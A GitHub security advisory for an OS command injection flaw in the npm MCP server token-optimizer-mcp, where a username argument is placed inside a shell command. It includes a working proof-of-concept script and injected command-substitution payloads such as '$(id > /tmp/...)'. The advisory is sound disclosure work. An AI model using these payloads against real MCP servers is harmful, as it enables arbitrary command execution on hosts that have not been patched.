# [H] Token Optimizer MCP: OS command injection in smart_user via username in get-user-info

## Summary
Severity: High
Advisory: GHSA-49mq-fc6q-3h46
CVE: CVE-2026-55157
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-14
Source: https://github.com/advisories/GHSA-49mq-fc6q-3h46
Type: github-advisory

## Affected
- npm: `@ooples/token-optimizer-mcp` — affected >=0 <5.1.0

## Details
### Summary

`token-optimizer-mcp` is vulnerable to OS command injection in the `smart_user` tool.

The `get-user-info` operation accepts a user-controlled `username` argument and later interpolates it into a shell command executed through `execAsync()`:

```ts
getent passwd "${username}" || grep "^${username}:" /etc/passwd
```

Although the value is wrapped in double quotes, POSIX shells still evaluate command substitution such as `$(...)` and backticks inside double quotes. As a result, an MCP client can provide a crafted username such as:

```text
$(id > /tmp/TOKEN_OPTIMIZER_SMART_USER_ID)
```

and execute arbitrary local commands with the privileges of the user running the MCP server.

This is a CWE-78 OS command injection issue.

Tested version:

```text
@ooples/token-optimizer-mcp v5.0.1
MCP serverInfo.name: token-optimizer-mcp
MCP serverInfo.version: 0.2.0
```

This issue is not related to the current `npm audit` dependency advisories. The vulnerability is in `token-optimizer-mcp`'s own tool implementation.

---

### Details

The vulnerable code path is in the `smart_user` implementation.

The `username` argument is eventually passed into a shell command similar to:

```ts
const { stdout: passwdOut } = await execAsync(
  `getent passwd "${username}" || grep "^${username}:" /etc/passwd`
);
```

The problem is that `username` is controlled by the MCP tool caller and is inserted into a command string executed by a shell.

Double quotes do not make this safe. In POSIX shells, command substitution is still evaluated inside double quotes:

```bash
"$(id > /tmp/TOKEN_OPTIMIZER_SMART_USER_ID)"
"`id`"
```

Therefore, a malicious `username` can execute arbitrary commands before `getent` or `grep` receives its arguments.

The affected MCP tool call is:

```text
tool: smart_user
operation: get-user-info
argument: username
```

Root cause:

```text
MCP-controlled username
→ interpolated into shell command string
→ executed through execAsync()
→ shell evaluates $(...) / backticks
→ arbitrary command execution
```

---

### PoC

The following PoC runs a harmless `id` command and writes the result to a temporary file under `/tmp`.

Prerequisites:

```text
Node.js installed
token-optimizer-mcp built from source
```

Build from source:

```bash
git clone https://github.com/ooples/token-optimizer-mcp.git
cd token-optimizer-mcp
npm install
npm run build
```

Run the PoC:

```bash
cd /path/to/token-optimizer-mcp

ENTRY=dist/server/index.js
ID_OUT="/tmp/TOKEN_OPTIMIZER_SMART_USER_ID_$(date +%s)_$$"
rm -f "$ID_OUT"

echo "[*] ENTRY=$ENTRY"
echo "[*] id output file: $ID_OUT"

python3 - "$ID_OUT" <<'PY' | timeout 20 node "$ENTRY" 2>&1 | tee /tmp/token_optimizer_smart_user_poc.log
import json
import sys

id_out = sys.argv[1]

# This value is inserted into:
# getent passwd "${username}" || grep "^${username}:" /etc/passwd
# Command substitution still executes inside double quotes.
evil_username = f'$(id > {id_out})'

messages = [
    {
        "jsonrpc": "2.0",
        "id": "init",
        "method": "initialize",
        "params": {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {
                "name": "poc",
                "version": "0"
            }
        }
    },
    {
        "jsonrpc": "2.0",
        "method": "notifications/initialized",
        "params": {}
    },
    {
        "jsonrpc": "2.0",
        "id": "poc-smart-user",
        "method": "tools/call",
        "params": {
            "name": "smart_user",
            "arguments": {
                "operation": "get-user-info",
                "username": evil_username,
                "useCache": False
            }
        }
    }
]

for msg in messages:
    print(json.dumps(msg), flush=True)
PY

sleep 1

if [ -f "$ID_OUT" ]; then
  echo "[VULN CONFIRMED] smart_user command injection executed:"
  cat "$ID_OUT"
  ls -l "$ID_OUT"
else
  echo "[FAIL] smart_user id output file not created"
  tail -120 /tmp/token_optimizer_smart_user_poc.log
fi
```

Expected result:

```text
[VULN CONFIRMED] smart_user command injection executed:
uid=1001(<local-user>) gid=1001(<local-user>) groups=...
-rw-rw-r-- 1 <local-user> <local-user> ... /tmp/TOKEN_OPTIMIZER_SMART_USER_ID_...
```

In my test, the MCP response also showed that the payload reached the shell command:

```text
Command failed: getent passwd "$(id > /tmp/TOKEN_OPTIMIZER_SMART_USER_ID_...)" || grep "^$(id > /tmp/TOKEN_OPTIMIZER_SMART_USER_ID_...):" /etc/passwd
```

The file `/tmp/TOKEN_OPTIMIZER_SMART_USER_ID_...` was created and contained the output of `id`, confirming command execution as the MCP server user.

A simpler marker-file variant also works:

```json
{
  "operation": "get-user-info",
  "username": "$(touch /tmp/TOKEN_OPTIMIZER_SMART_USER_PWNED)",
  "useCache": false
}
```

---

### Impact

This is an OS command injection vulnerability.

Any MCP client that can call the `smart_user` tool can execute arbitrary shell commands through the `username` argument of the `get-user-info` operation.

The commands execute with the privileges of the user running the `token-optimizer-mcp` server.

Confirmed impact:

```text
execution of `id` as the MCP server user
arbitrary file creation under /tmp through an injected command
```

## References
- https://github.com/ooples/token-optimizer-mcp/security/advisories/GHSA-49mq-fc6q-3h46
- https://github.com/ooples/token-optimizer-mcp/commit/b4ee96dac799cbfba0a9f9c17844ce9d613cbcc7
- https://github.com/ooples/token-optimizer-mcp
- https://github.com/ooples/token-optimizer-mcp/releases/tag/v5.1.0
